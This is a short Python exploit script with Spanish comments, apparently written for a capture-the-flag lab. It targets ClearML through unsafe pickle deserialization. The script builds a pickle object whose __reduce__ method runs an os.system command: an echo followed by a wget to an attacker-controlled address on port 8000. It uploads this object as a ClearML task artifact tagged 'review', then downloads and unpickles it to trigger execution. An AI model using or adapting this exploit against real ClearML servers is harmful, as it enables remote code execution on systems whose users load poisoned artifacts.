import pickle
import os
from clearml import Task
import requests

# Crear el artefacto malicioso
class RunCommand:
    def __reduce__(self):
        return (os.system, ('echo "Hacked by sl4sh1t0"; wget http://10.10.14.10:8000/itsworking;',))

command = RunCommand()

with open('pickle_artifact.pkl', 'wb') as f:
    pickle.dump(command, f)

# Inicializar un nuevo task en ClearML
task = Task.init(project_name='Black Swan', task_name='malicious_task3')

# Subir el artefacto al task
artifact_name = 'pickle_artifact'
artifact_file = 'pickle_artifact.pkl'
task.upload_artifact(name=artifact_name, artifact_object=artifact_file)

# AÃ±adir el tag al task (como lista)
task.set_tags(['review'])

# Finalizar el task
task.close()

# Interrumpir y pedir al usuario que ingrese el task_id
task_id = input("Por favor, ingrese el task_id del task que se acaba de subir: ")

# Obtener y ejecutar el artefacto
task = Task.get_task(task_id=task_id)

artifact = task.artifacts.get('pickle_artifact')
artifact_url = artifact.url

# Descargar el archivo desde el URL
response = requests.get(artifact_url)
with open('downloaded_artifact.pkl', 'wb') as f:
    f.write(response.content)

# Deserializar y ejecutar el artefacto
with open('downloaded_artifact.pkl', 'rb') as f:
    pickle.load(f)
